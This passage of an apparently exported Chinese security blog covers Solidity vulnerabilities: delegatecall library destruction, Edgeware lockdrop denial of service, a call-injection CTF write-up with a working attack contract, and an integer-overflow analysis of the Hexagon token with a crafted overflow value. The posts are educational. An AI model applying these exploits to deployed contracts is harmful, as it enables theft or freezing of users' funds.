class="line">&#125;</span><br></pre></td></tr></table></figure><br>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p><h2 id="依赖库问题"><a href="#依赖库问题" class="headerlink" title="依赖库问题"></a>依赖库问题</h2><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p><p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p><p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p><p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p><ul><li><p>攻击流程</p><p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p><p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p></li><li>解决方案<br>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</li></ul><h2 id="逻辑设计错误"><a href="#逻辑设计错误" class="headerlink" title="逻辑设计错误"></a>逻辑设计错误</h2><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p><p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function lock(Term term, bytes calldata edgewareAddr, bool isValidator)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 eth &#x3D; msg.value;</span><br><span class="line">        address owner &#x3D; msg.sender;</span><br><span class="line">        uint256 unlockTime &#x3D; unlockTimeForTerm(term);</span><br><span class="line">        &#x2F;&#x2F; Create ETH lock contract</span><br><span class="line">        Lock lockAddr &#x3D; (new Lock).value(eth)(owner, unlockTime);</span><br><span class="line">        &#x2F;&#x2F; ensure lock contract has at least all the ETH, or fail</span><br><span class="line">        assert(address(lockAddr).balance &gt;&#x3D; msg.value);</span><br><span class="line">        emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码做了强制判断:<br><code>assert(address(lockAddr).balance &gt;= msg.value);</code><br>属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。 但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Call注入漏洞</title>
      <link href="/CallAttack/"/>
      <url>/CallAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="Call注入漏洞刷题实践"><a href="#Call注入漏洞刷题实践" class="headerlink" title="Call注入漏洞刷题实践"></a>Call注入漏洞刷题实践</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>写本文是为了总结一下博主在这两天中做一个靶场题目时遇到的一些问题，以及对call注入的一些见解。</p><h2 id="Call函数"><a href="#Call函数" class="headerlink" title="Call函数"></a>Call函数</h2><p>首先我们先了解一下call函数：<br/><br>合约之间的调用有2种方式： 底层的call方式和 new 合约的方式<br/><br>solidity 提供了 call()、delegatecall()、callcode() 三个函数来实现合约直接的调用及交互，这些函数的滥用导致了各种安全风险和漏洞。在使用第二种方式时，如果处理不当很可能产生致命的漏洞 —— 跨合约调用漏洞，主要就是 call() 注入函数导致的.</p><p>call() 函数对某个合约或者本地合约的某个方法的调用方式：</p><ul><li><code>&lt;address&gt;.call(方法选择器,arg1,arg2,...)</code></li><li><code>&lt;address&gt;.call(bytes)</code><blockquote><p>综上  合约之间的调用建议的方式是：通过new 合约，通过合约的方式去调用，而不是通过call的方式去调用，因为这样会失去控制权。<br/></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>接下来我们通过一个call注入攻击的案例来更深入的了解一下call函数:<br>2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。</p></blockquote></li></ul><p>ATN Token合约采用的是在传统ERC20Token合约基础上的扩展版本ERC223，并在其中使用了 dapphub/ds-auth 库。<br>单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。<br/><br>ERC223转账代码如下：<br><img src="/exm1.png" alt=""><br>黑客转账时在方法中输入了以下参数成功实现了攻击：<br><img src="/exm2.png" alt=""><br>该交易执行的时候 receiver 会被 <em>to(ATN合约地址) 赋值， ATN 合约会调用 _custom_fallback 即 DSAuth 中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，owner</em>参数为_from(黑客地址)。<br/><br>ds-auth库中setOwner 代码如下：<br><img src="/exm3.png" alt=""><br>在执行 <code>setOwner</code> 时会先验证 auth 合法性，而此时！ msg.sender 就是ATN的合约地址，因此完美的避开了auth的检查。setOwner 的 modifier auth 代码：<br><img src="/exm4.png" alt=""></p><blockquote><p>总的来说</p><ol><li>Call函数自由度过大，应谨慎使用作为底层函数，对于一些敏感操作或者权限判断函数，则不要轻易将合约自身的账户地址作为可信的地址。</li><li>调用的函数应该做严格的限制，避开调用任意函数的隐患</li><li>用到类似ERC223推荐实现的custom_fallback和ds-auth的合约，或者说内置有其他权限控制得合约的以太坊Token，很可能也存在这个call的注入问题</li></ol></blockquote><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>通过以上的介绍，想必大家对call函数以及其漏洞已经有了自己的理解。<br/><br>call函数出现在底层合约中需要格外重视，如非必要最好不要用，用new代替。<br/><br>call注入的主要攻击思路：</p><blockquote><p>由于call参数类型不限，这给了参数很大的自由度，黑客可以通过构造参数去调用与此合约相关联的所有方法，并且在调用时msg.sender的值会变为合约的地址，这可能会绕过关键函数的一些判断条件，从而使黑客通过”冒名调用”获得利益。</p></blockquote><h2 id="靶场题目："><a href="#靶场题目：" class="headerlink" title="靶场题目："></a>靶场题目：</h2><p>说了这么多，让我们回到问题的起点：<br>漏洞源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">contract Vuln&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    string public name     &#x3D; &quot;Chain&quot;;</span><br><span class="line">    string public symbol   &#x3D; &quot;CHA&quot;;</span><br><span class="line">    uint8  public decimals &#x3D; 18;</span><br><span class="line">    uint public totalSupply&#x3D;10000000000;</span><br><span class="line">    bool  public isLoan&#x3D;false;</span><br><span class="line">    bool public solved;</span><br><span class="line">    event  Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">    event  Deposit(address indexed to, uint number);</span><br><span class="line">    event  Withdrawal(address indexed from, uint number);</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; uint)                       public  balanceOf;</span><br><span class="line">    mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint))  public  allowance;</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        owner&#x3D;msg.sender;</span><br><span class="line">        balanceOf[owner]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">        balanceOf[address(this)]&#x3D;totalSupply&#x2F;2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; number);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; number;</span><br><span class="line">        (msg.sender).transfer(number);</span><br><span class="line">        emit Withdrawal(msg.sender, number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][to] &#x3D; number;</span><br><span class="line">        emit Approval(msg.sender, to, number);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">        balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint number)</span><br><span class="line">        public</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; number);</span><br><span class="line"></span><br><span class="line">        if (from !&#x3D; msg.sender &amp;&amp; allowance[from][msg.sender] !&#x3D; 2**256-1) &#123;</span><br><span class="line">            require(allowance[from][msg.sender] &gt;&#x3D; number);</span><br><span class="line">            allowance[from][msg.sender] -&#x3D; number;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; number;</span><br><span class="line">        balanceOf[to] +&#x3D; number;</span><br><span class="line"></span><br><span class="line">        emit Transfer(from, to, number);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public returns(bool)&#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete() public &#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">        require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">        solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><strong>拿到flag的要求是使isSolved()返回true</strong><br>读完源码后，发现题目要我们通过攻击达成<code>complete()</code>函数里的两个限制条件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function complete() public &#123;</span><br><span class="line"></span><br><span class="line">       require(balanceOf[msg.sender]&gt;10000);</span><br><span class="line">       require(allowance[address(this)][msg.sender]&gt;10000);</span><br><span class="line">       solved&#x3D;true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>即是让我们利用漏洞从合约成功盗取10000以上的token<br/><br>让我们把视线放到<code>fakeflashloan()</code>这个奇怪的函数上，可以注意到这个函数并没有很苛刻的“准入条件”，让我们可以很轻松的执行到里面的call方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;</span><br><span class="line">        require(isLoan&#x3D;&#x3D;false&amp;&amp;value&gt;&#x3D;0&amp;&amp;value&lt;&#x3D;1000);</span><br><span class="line">        balanceOf[address(this)]-&#x3D;value;</span><br><span class="line">        balanceOf[target]+&#x3D;value;</span><br><span class="line"></span><br><span class="line">        address(target).call(data);</span><br><span class="line"></span><br><span class="line">        isLoan&#x3D;true;</span><br><span class="line">        require(balanceOf[target]&gt;&#x3D;value);</span><br><span class="line">        balanceOf[address(this)]+&#x3D;value;</span><br><span class="line">        balanceOf[target]-&#x3D;value;</span><br><span class="line">        isLoan&#x3D;false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>而call后面跟的参数是bytes类型的data,这就给了我们很大的操作空间。此时我至少想到了两种拿到flag的方式，一种是通过call注入调用transfer和approve函数给我自己转账，实现盗币后执行<code>complete()</code>方法。另一种方式比较投机取巧，通过call注入调用approve函数，<code>_to</code>填合约地址，这样allowance就记录了一个合约自己给自己的一笔token的approve，同样可以绕开complete的两个限制条件拿到flag<br/><br>但是我觉得题目的初衷应该是要我们完成盗币攻击，于是将其实现，攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">import&quot;.&#x2F;Vuln.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line"></span><br><span class="line">    Vuln cont;</span><br><span class="line">    </span><br><span class="line">    constructor(address _adr)&#123;</span><br><span class="line">        cont &#x3D; Vuln(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        bytes memory byt;</span><br><span class="line">        bytes memory byt2;</span><br><span class="line">        address adr&#x3D;0x100200fF289D4dA0634fF36d7f5D96524f7EFf67;&#x2F;&#x2F;我的账户地址</span><br><span class="line">        byt  &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        byt2 &#x3D;  abi.encodePacked(bytes4(keccak256(&quot;approve(address,uint256)&quot;)),bytes32(adr),bytes32(10001));</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt);&#x2F;&#x2F;transfer 10001个token给我</span><br><span class="line">        cont.fakeflashloan(1000,address(cont),byt2);&#x2F;&#x2F;approve 10001个token的approve给我</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意：原题中用到了solidity7.0版本的编译环境，在新版的solidity中攻击合约中<code>bytes32(adr),bytes32(10001)</code>的语法是不被允许的,所以我直接选择了用更低版本的暂时替代。</p><blockquote><p>PS：有关新版本的写法我会在后续更新</p></blockquote><p>在这里我们通过调用<code>fakeflashloan()</code>这个问题函数，构造了<code>byt</code>和<code>byt2</code>这样的bytes去实现call注入的函数调用。</p><p>构造这个bytes占了我解题时常的90％，一直攻击无效，因为这个靶场测试网没办法debug,给我带来了很多困难。最终我选择脱离靶场的测试网环境，在本地进行测试。<br/><br>有关bytes的构造大家可以参考<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html?highlight=abi" target="_blank" rel="noopener">solidity的abi参考文档</a><br><img src="/abi.png" alt=""></p><h1 id="攻击效果："><a href="#攻击效果：" class="headerlink" title="攻击效果："></a>攻击效果：</h1><p>夺旗：<br><img src="/CallFlag.png" alt=""><br>合约被攻击后：<br><img src="/suc1.png" alt=""><br><img src="/suc2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OverflowAttack</title>
      <link href="/OverflowAttack/"/>
      <url>/OverflowAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在介绍溢出攻击前，让我们先来了解一下solidity中溢出和下溢。</p><ul><li>溢出<br>  假设我们有一个 uint8, 只能存储8 bit数据。这意味着我们能存储的最大数字就是二进制 11111111 (或者说十进制的 2^8 - 1 = 255).<br/><br>  来看看下面的代码。最后 number 将会是什么值？<br/>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint8 number &#x3D; 255;</span><br><span class="line">number++; &#x2F;&#x2F;number &#x3D; 0</span><br></pre></td></tr></table></figure>  在这个例子中，我们导致了溢出 — 虽然我们加了1， 但是number 出乎意料地等于 0了。<br/><br>  <img src="overflow1.png" alt=""><br>  下溢(underflow)也类似，如果你从一个等于 0 的 uint8 减去 1, 它将变成 255 (因为 uint 是无符号的，其不能等于负数)。<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>上述就是在solidity中，数据溢出的原理，那么在智能合约中，由于合约代码考虑不规范，可能会导致合约数据溢出漏洞，下来举例一个在以太坊公链中有数据溢出BUG的合约代码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Hexagon &#123;</span><br><span class="line">&#x2F;* Main information *&#x2F;</span><br><span class="line">string public constant name &#x3D; &quot;Hexagon&quot;;</span><br><span class="line">string public constant symbol &#x3D; &quot;HXG&quot;;</span><br><span class="line">uint8 public constant decimals &#x3D; 4;</span><br><span class="line">uint8 public constant burnPerTransaction &#x3D; 2;</span><br><span class="line">uint256 public constant initialSupply &#x3D; 420000000000000;</span><br><span class="line">uint256 public currentSupply &#x3D; initialSupply;</span><br><span class="line"></span><br><span class="line">&#x2F;* Create array with balances *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">&#x2F;* Create array with allowance *&#x2F;</span><br><span class="line">mapping (address &#x3D;&gt; mapping (address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">&#x2F;* Constructor *&#x2F;</span><br><span class="line">function Hexagon() public &#123;</span><br><span class="line">    &#x2F;* Give creator all initial supply of tokens *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] &#x3D; initialSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* PUBLIC *&#x2F;</span><br><span class="line">&#x2F;* Send tokens *&#x2F;</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    _transfer(msg.sender, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Return current supply *&#x2F;</span><br><span class="line">function totalSupply() public constant returns (uint) &#123;</span><br><span class="line">    return currentSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Burn tokens *&#x2F;</span><br><span class="line">function burn(uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[msg.sender] -&#x3D; _value;</span><br><span class="line">    &#x2F;* Send to the black hole *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(msg.sender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Allow someone to spend on your behalf *&#x2F;</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Check if the sender has already  *&#x2F;</span><br><span class="line">    require(_value &#x3D;&#x3D; 0 || allowance[msg.sender][_spender] &#x3D;&#x3D; 0);</span><br><span class="line">    &#x2F;* Add to allowance  *&#x2F;</span><br><span class="line">    allowance[msg.sender][_spender] &#x3D; _value;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Transfer tokens from allowance *&#x2F;</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">    &#x2F;* Prevent transfer of not allowed tokens *&#x2F;</span><br><span class="line">    require(allowance[_from][msg.sender] &gt;&#x3D; _value);</span><br><span class="line">    &#x2F;* Remove tokens from allowance *&#x2F;</span><br><span class="line">    allowance[_from][msg.sender] -&#x3D; _value;</span><br><span class="line"></span><br><span class="line">    _transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* INTERNAL *&#x2F;</span><br><span class="line">function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">    &#x2F;* Prevent transfer to 0x0 address. Use burn() instead  *&#x2F;</span><br><span class="line">    require (_to !&#x3D; 0x0);</span><br><span class="line">    &#x2F;* Check if the sender has enough *&#x2F;</span><br><span class="line">    &#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">    require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br><span class="line">    &#x2F;* Check for overflows *&#x2F;</span><br><span class="line">    require (balanceOf[_to] + _value &gt; balanceOf[_to]);</span><br><span class="line">    &#x2F;* Subtract from the sender *&#x2F;</span><br><span class="line">    balanceOf[_from] -&#x3D; _value + burnPerTransaction;</span><br><span class="line">    &#x2F;* Add the same to the recipient *&#x2F;</span><br><span class="line">    balanceOf[_to] +&#x3D; _value;</span><br><span class="line">    &#x2F;* Apply transaction fee *&#x2F;</span><br><span class="line">    balanceOf[0x0] +&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Update current supply *&#x2F;</span><br><span class="line">    currentSupply -&#x3D; burnPerTransaction;</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Burn(_from, burnPerTransaction);</span><br><span class="line">    &#x2F;* Notify network *&#x2F;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Events *&#x2F;</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">event Burn(address indexed from, uint256 value);</span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在合约的转账代码 function _transfer(address _from, address _to, uint _value) internal 实现中，判断转账支付方账户是否具有足够的余额，有如下的判断语句：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;问题代码，数据溢出的攻击点</span><br><span class="line">require (balanceOf[_from] &gt;&#x3D; _value + burnPerTransaction);</span><br></pre></td></tr></table></figure>加入攻击者给<code>_value</code>一个很大的值，那么在加上<code>burnPerTransaction</code>后很可能会发生溢出，相加后的结果很小，导致<code>require</code>发生错误的判断。结果给接收方地址增加一笔非常大的TOKEN。下面将举个例子说明：<blockquote><p>假设合约中 burnPerTransaction = 0xf ，<br>所以当转账_value为0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0时，<br>_value + burnPerTransaction =0 